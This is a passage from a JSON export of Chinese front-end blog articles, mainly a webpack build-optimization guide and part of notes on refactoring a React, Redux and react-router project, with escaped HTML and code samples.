class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page1-B.js\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edefer\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在\u003ca target=\"_blank\" href=\"(https://github.com/GeoffZhu/geoffzhu.github.io/issues/2)\"\u003eJS篇\u003c/a\u003e中，我已经解释过这套结构中JS的执行顺序了，本篇只是加入了CSS和字体。至此，我心中终极完美的页面HTML结构就是这样了。\u003c/p\u003e\n\u003cp\u003e如果你对异步加载CSS的方案感兴趣，欢迎留言与我讨论！\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e扩展阅读\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#Webkit_CSS_parser\"\u003e浏览器的工作原理\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.jianshu.com/p/24ffa6d45087\"\u003e关于Preload, 你应该知道些什么？\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://juejin.im/post/58e8acf10ce46300585a7a42\"\u003ePreload，Prefetch 和它们在 Chrome 之中的优先级\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1514894870.0607","__v":0}
{"_id":{"$oid":"5a4b76338b69bb25d83da3d7"},"id":"5a49fb696fb9a0451e402718","author":{"$oid":"5a4b76338b69bb25d83da3c8"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"webpack优化不完全指南","meta":{"likeCount":0},"tag":["Webpack","JavaScript","前端","Node.js"],"comment":[],"shortContent":"实现思路(参考vue-cil)，通用配置可以设置一个base文件然后exports，在其他的配置文件中require进来。 上面这个配置中new webpack.optimize.UglifyJsPlugin()就可以放入webpack.prod.conf.js中，因为代码压缩…","content":"\u003ch2 class=\"heading\"\u003e基础篇\u003c/h2\u003e\n\u003cp\u003e最基本的一个webpack配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs JavaScript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e webpack = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'webpack'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e HtmlWebpackPlugin = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'html-webpack-plugin'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ExtractTextPlugin = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'extract-text-webpack-plugin'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n        \u003cspan class=\"hljs-attr\"\u003eentry\u003c/span\u003e: __dirname + \u003cspan class=\"hljs-string\"\u003e\"/app/main.js\"\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//已多次提及的唯一入口文件\u003c/span\u003e\n        output: {\n            \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: __dirname + \u003cspan class=\"hljs-string\"\u003e\"/build\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"bundle-[hash].js\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-attr\"\u003edevtool\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'none'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003edevServer\u003c/span\u003e: {\n            \u003cspan class=\"hljs-attr\"\u003econtentBase\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"./public\"\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//本地服务器所加载的页面所在的目录\u003c/span\u003e\n            historyApiFallback: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e//不跳转\u003c/span\u003e\n            inline: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003ehot\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n            \u003cspan class=\"hljs-attr\"\u003erules\u003c/span\u003e: [{\n                    \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/(\\.jsx|\\.js)$/\u003c/span\u003e,\n                    \u003cspan class=\"hljs-attr\"\u003euse\u003c/span\u003e: {\n                        \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e\n                    }\n                }, {\n                    \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/\\.css$/\u003c/span\u003e,\n                    \u003cspan class=\"hljs-attr\"\u003euse\u003c/span\u003e: ExtractTextPlugin.extract({\n                        \u003cspan class=\"hljs-attr\"\u003efallback\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"style-loader\"\u003c/span\u003e,\n                        \u003cspan class=\"hljs-attr\"\u003euse\u003c/span\u003e: [{\n                            \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"css-loader\"\u003c/span\u003e,\n                            \u003cspan class=\"hljs-attr\"\u003eoptions\u003c/span\u003e: {\n                                \u003cspan class=\"hljs-attr\"\u003emodules\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n                                \u003cspan class=\"hljs-attr\"\u003elocalIdentName\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'[name]__[local]--[hash:base64:5]'\u003c/span\u003e\n                            }\n                        }, {\n                            \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"postcss-loader\"\u003c/span\u003e\n                        }],\n                    })\n                }\n            }\n        ]\n    },\n    \u003cspan class=\"hljs-attr\"\u003eplugins\u003c/span\u003e: [\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.BannerPlugin(),\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e HtmlWebpackPlugin({\n            \u003cspan class=\"hljs-attr\"\u003etemplate\u003c/span\u003e: __dirname + \u003cspan class=\"hljs-string\"\u003e\"/app/index.tmpl.html\"\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e//new 一个这个插件的实例，并传入相关的参数\u003c/span\u003e\n        }),\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.optimize.OccurrenceOrderPlugin(),\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.optimize.UglifyJsPlugin(),\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ExtractTextPlugin(\u003cspan class=\"hljs-string\"\u003e\"style.css\"\u003c/span\u003e)\n    ]\n};\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来基于这份配置进行一个优化:\u003cbr\u003e\n首先我们得区分开发环境、生产环境以及测试环境(这个在国内用的公司少)\n实现思路(参考vue-cil)，通用配置可以设置一个base文件然后exports，在其他的配置文件中require进来。\u003c/p\u003e\n\u003cp\u003e上面这个配置中new webpack.optimize.UglifyJsPlugin()就可以放入webpack.prod.conf.js中，因为代码压缩丑化只需要在生产环境中使用，在开发过程开启的话，不仅编译时间加长还不利于调试。\u003c/p\u003e\n\u003cp\u003emodule与entry、output这个就可以放到webpack.base.cong.js文件中，这些配置是通用的不管在生产环境还是开发环境中都是用得到的。\u003c/p\u003e\n\u003cp\u003edevServer则是在开发过程中需要启动一个服务器然后再开启热替换功能。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在module中也可进行些优化，例如在后缀为.js文件的处理中添加:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003einclude: [resolve('src'), resolve('test')]\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这样loader加载器就只会匹配src/与/test目录下的文件，至于node_modules目录下的文件则跳过，假如没加这一限制条件的话，node_modules下那么多的js文件，想想都觉得恐怖，并且别人发布出来的包文件一般都是经过babel转成ES5标准的。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e添加alias，如:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003ealias: {\u003cbr\u003e\n'@': resolve('src')\u003cbr\u003e\n}\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这样当webpack遇到import('@xxx')的时候就会直接在src/目录下去寻找，能节省不少的目录查询时间\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e进阶篇\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e多页面优化\u003c/h4\u003e\n\u003cp\u003e当我们的项目是多个页面的时候，我们需要用到HtmlWebpackPlugin插件，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs JavaScript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i\u0026lt; html.length; i++) {\n  plugins.push(\n    \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e HtmlWebpackPlugin({\n        \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e:fileName,\n        \u003cspan class=\"hljs-attr\"\u003etemplate\u003c/span\u003e: path.join(\u003cspan class=\"hljs-string\"\u003e'./src/html/'\u003c/span\u003e, fileName),\n        \u003cspan class=\"hljs-attr\"\u003einject\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eminify\u003c/span\u003e: {\n          \u003cspan class=\"hljs-attr\"\u003eremoveComments\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n          \u003cspan class=\"hljs-attr\"\u003ecollapseWhitespace\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n          \u003cspan class=\"hljs-attr\"\u003eremoveAttributeQuotes\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-attr\"\u003echunksSortMode\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'dependency'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003echunks\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e'manifest'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'vendor'\u003c/span\u003e, cur]\n      }))\n  )\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有多少个页面就push多少个HtmlWebpackPlugin进去，至于页面的获取我们可以通过walk-sync来做到，通过获取目录下的入口文件来判断有多少个页面存在。\u003cbr\u003e\n我在优化过程中遇到个坑，当webpack从2.x升级为3.x的时候，\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ecompilation.getStats().toJson()\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这个函数的执行时间会大大加长，我看到其实在issue里头有人提出来了，不过作者并没有给合并到master中去。还有点就是：当页面是多页面的时候每一次小的改动都会把所有的html文件重新生成一次，针对这两个优化我在Githubfork了下html-webpack-plugin，并发布了html-webpack-plugin-multihtml。我们的项目一共是有49个页面之前rebuild是花费5-7s ，优化后保持在1s左右。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e提取公共代码CommonsChunkPlugin\u003c/h4\u003e\n\u003cp\u003e有些类库如utils, bootstrap之类的可能被多个页面共享，最好是可以合并成一个js，而非每个js单独去引用。这样能够节省一些空间。这时我们可以用到CommonsChunkPlugin，我们指定好生成文件的名字，以及想抽取哪些入口js文件的公共代码，webpack就会自动帮我们合并好。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs JavaScript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.optimize.CommonsChunkPlugin({\n      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'vendor'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003echunks\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.keys(entrys),\n      \u003cspan class=\"hljs-attr\"\u003eminChunks\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodule, count\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.resource \u0026amp;\u0026amp; \u003cspan class=\"hljs-regexp\"\u003e/\\.js$/\u003c/span\u003e.test(\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.resource) \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.resource.indexOf(path.join(__dirname, \u003cspan class=\"hljs-string\"\u003e'../node_modules'\u003c/span\u003e)) === \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u0026amp;\u0026amp; count \u0026gt; \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e)\n      }\n}),\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个是针对多页面优化的，CommonsChunkPlugin会自己计算当一个类库被引用的次数超过8次，就把它打包至vendor中，这样就不必全打包至一个index.js里头\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eexternals提取常用库\u003c/h4\u003e\n\u003cp\u003eexternals 配置选项提供了「从输出的 bundle 中排除依赖」的方法。相反，所创建的 bundle 依赖于那些存在于用户环境(consumer's environment)中的依赖。\u003cbr\u003e\nexternals主要是防止将某些import的包打包到bundle中，而是在运行时(runtime)再去从外部获取这些扩展依赖\u003c/p\u003e\n\u003cp\u003e配置也挺简单的接下来贴下代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eindex.html中引入\n\n\u0026lt;script src=\u003cspan class=\"hljs-string\"\u003e\"https://code.jquery.com/jquery-3.1.0.js\"\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ewebpack.config.js中配置\n\nexternals: {\n  jquery: \u003cspan class=\"hljs-string\"\u003e'jQuery'\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就能在代码中通过import引用了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport $ from \u003cspan class=\"hljs-string\"\u003e'jquery'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003euglifyPlugin多线程压缩代码\u003c/h4\u003e\n\u003cp\u003e在webpack的默认情况下，都是单线程跑的，有个叫webpack-uglify-parallel的插件，它能够充分调用计算机的资源，利用计算机的多核特性进行代码压缩。\u003cbr\u003e\n使用方法也挺简单的，\n把之前webpack.prod.conf.js中的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enew webpack.optimize.UglifyJsPlugin({\n  compress: {\n    warnings: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    drop_console: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  },\n  comments: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n}),\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e替换为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar os = require(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e);\nvar UglifyJsParallelPlugin = require(\u003cspan class=\"hljs-string\"\u003e'webpack-uglify-parallel'\u003c/span\u003e);\n\nmodule.exports = {\n    /// ... rest of config\n    plugins: [\n        new UglifyJsParallelPlugin({\n            workers: os.cpus().length, // usually having as many workers as cpu cores gives good results\n            // other uglify options\n        })\n    ]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即可\nGitHub地址\u003ca target=\"_blank\" href=\"https://github.com/tradingview/webpack-uglify-parallel\"\u003e：webpack-uglify-parallel\u003c/a\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eHappypack\u003c/h4\u003e\n\u003cp\u003ehappypack 是 webpack 的一个插件，目的是通过多进程模型，来加速代码构建。目前我们项目中已经配置并且上线了，效果还可以，从最初的40s减少到30s的编译时间。\u003cbr\u003e\n配置按照GitHub上的来，也不难\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar HappyPack = require(\u003cspan class=\"hljs-string\"\u003e'happypack'\u003c/span\u003e);\nvar happyThreadPool = HappyPack.ThreadPool({ size: os.cpus().length });\n\n// 省略其余配置\nmodule: {\n  loaders: [\n      {\n        \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e: /\\.less$/,\n        loader: ExtractTextPlugin.extract(\u003cspan class=\"hljs-string\"\u003e'style'\u003c/span\u003e,path.resolve(__dirname,\u003cspan class=\"hljs-string\"\u003e'./node_modules'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'happypack/loader'\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'?id=less'\u003c/span\u003e\n        )\n      }\n    ]\n  },\n  plugins: [\n      new HappyPack({\n        id: \u003cspan class=\"hljs-string\"\u003e'less'\u003c/span\u003e,\n        loaders: [\u003cspan class=\"hljs-string\"\u003e'css!less'\u003c/span\u003e],\n        threadPool: happyThreadPool,\n        cache: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        verbose: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n      })\n  ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我在优化我们项目的webpack遇到了两个坑，一个就是上面提到的，webpack2升级3编译时间增多，另一个就是devServer在低版本安卓机型上跑步起来。devServer这个使用\"webpack-dev-server\": \"2.7.1\"即可，因为2.9.x版本使用的是es6的写法安卓4.1以下不支持，ie9以下也不支持。\u003c/p\u003e\n","buildTime":"1514893368.9673","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3d8"},"id":"5a4a6f35f265da4335631d83","author":{"$oid":"5a4b76338b69bb25d83da3d2"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b2c29647c0ab4?w=1920\u0026h=1080\u0026f=jpeg\u0026s=1002665","https://user-gold-cdn.xitu.io/2018/1/2/160b2c29a654817d?w=123\u0026h=161\u0026f=png\u0026s=7830","https://user-gold-cdn.xitu.io/2018/1/2/160b2c29a7cde213?w=161\u0026h=191\u0026f=png\u0026s=10028"],"screenShot":null}],"title":"前端项目重构的些许收获","meta":{"likeCount":0},"tag":["前端","React.js","Node.js","API"],"comment":[],"shortContent":"这个项目开始之初，赶时间上线。很多地方基本没怎么管代码规范，直到一期完毕回过头来看之前写的代码，不忍直视。为了之后接手的人能更加轻松，也为了自己之后debug更加顺手，边开始二期的部分需求，边重构一期的部分代码，还是有部分收获。 之前的架构是react-router2，后面换成…","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b2c29647c0ab4?w=1920\u0026amp;h=1080\u0026amp;f=jpeg\u0026amp;s=1002665\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e题图：Pixabay\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这个项目开始之初，赶时间上线。很多地方基本没怎么管代码规范，直到一期完毕回过头来看之前写的代码，不忍直视。为了之后接手的人能更加轻松，也为了自己之后debug更加顺手，边开始二期的部分需求，边重构一期的部分代码，还是有部分收获。\u003c/p\u003e\n\u003cp\u003e项目技术栈是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003enodejs\u003c/li\u003e\n\u003cli\u003ejavascript\u003c/li\u003e\n\u003cli\u003ereact\u003c/li\u003e\n\u003cli\u003eredux\u003c/li\u003e\n\u003cli\u003ereact-router\u003c/li\u003e\n\u003cli\u003ewebpack\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e之前的架构是react-router2，后面换成了react-router4。代码看起来更加的模块化。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e入口模块化\u003c/h4\u003e\n\u003cp\u003e项目本身是一个系统合集，用户根据权限的不同会展示不同的菜单导航。目前是有3个部分：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b2c29a654817d?w=123\u0026amp;h=161\u0026amp;f=png\u0026amp;s=7830\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e每个模块单独的action、router、reducer与server。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b2c29a7cde213?w=161\u0026amp;h=191\u0026amp;f=png\u0026amp;s=10028\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003ewebpack切片打包\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eentry: {\n\u0009index: \u003cspan class=\"hljs-string\"\u003e'./index.jsx'\u003c/span\u003e,\n\u00091: \u003cspan class=\"hljs-string\"\u003e'./1/router/index.jsx'\u003c/span\u003e,\n\u00092: \u003cspan class=\"hljs-string\"\u003e'./2/router/index.jsx'\u003c/span\u003e,\n\u00093: \u003cspan class=\"hljs-string\"\u003e'./3/router/index.jsx'\u003c/span\u003e,\n\u0009vendor: [\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'react-router-dom'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'antd'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'prop-types'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'react-router-redux'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'react-redux'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'redux'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'lodash'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'react-dom'\u003c/span\u003e,\n\u0009],\n},\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e路由\u003c/h4\u003e\n\u003cp\u003e根路由只需指向每个模块的路由文件即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Route path=\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e exact component={IndexComponent} /\u0026gt;\n{/* xxx路由 start */}\n\u0026lt;Route path=\u003cspan class=\"hljs-string\"\u003e\"/xxx1\"\u003c/span\u003e component={1Layout} /\u0026gt;\n{/* xxx路由 start */}\n\u0026lt;Route path=\u003cspan class=\"hljs-string\"\u003e\"/xxx2\"\u003c/span\u003e component={2Layout} /\u0026gt;\n{/* xxx路由 start */}\n\u0026lt;Route path=\u003cspan class=\"hljs-string\"\u003e\"/xxx3\"\u003c/span\u003e component={3Layout} /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e权限、接口转发\u003c/h4\u003e\n\u003cp\u003e因为各个系统的后端不是同一批人，部署的机器也不是固定的，于是用 node 做了一层接口转发，前端页面访问固定的地址，然后通过 node 去访问不同的后端机器。同时权限部分需要携带cookie跨域，正好 node 一起做了。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e测试、正式\u003c/h4\u003e\n\u003cp\u003e这是之前的区分线上线下打包的地址，由于webpack没有做过多的设置，于是暂时用这样的方式区分打包环境。但是我更想用 shell 脚本来区分，可以更方便的直接调试线上接口。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst isLocal = location.host.indexOf(\u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e) === 0;\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const serverUrl = !IS_PRODUCTION ? devUrl : isLocal ? devUrl : `//\u003cspan class=\"hljs-variable\"\u003e${location.host}\u003c/span\u003e`;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e枚举\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e前端静态枚举值\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e不允许页面出现以下字样：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e1，2，3 ...int类型\u003c/li\u003e\n\u003cli\u003e'成功'，'失败'，... 等字符类型\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 静态枚举值及请求API参数\nthis._private = {\n\u0009dispatch: props.dispatch,\n\u0009// 路由方法\n\u0009\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e: props.history,\n\u0009// 当前手机系统\n\u0009os: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009...\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e错误码 ，规范化错误提示\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst errnoToErrmsg = {\n unknownError: 1001,\n paramLost: 1002,\n paramInvalid: 1003,\n authFailed: 1006,\n signExpired: 1007,\n\u0009...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e状态值 ，规范前端业务代码\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst xxxStatus = {\n\u0009toBeAssigned: \u003cspan class=\"hljs-string\"\u003e'待分配'\u003c/span\u003e,\n\u0009pending: \u003cspan class=\"hljs-string\"\u003e'待处理'\u003c/span\u003e,\n\u0009processing: \u003cspan class=\"hljs-string\"\u003e'处理中'\u003c/span\u003e,\n\u0009processed: \u003cspan class=\"hljs-string\"\u003e'已处理'\u003c/span\u003e,\n\u0009notDealtWith: \u003cspan class=\"hljs-string\"\u003e'不处理'\u003c/span\u003e,\n\u0009description(rawValue) {\n\u0009\u0009switch (rawValue) {\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e this.toBeAssigned:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e this.pending:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e this.processing:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e this.processed:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'4'\u003c/span\u003e;\n\u0009\u0009\u003cspan 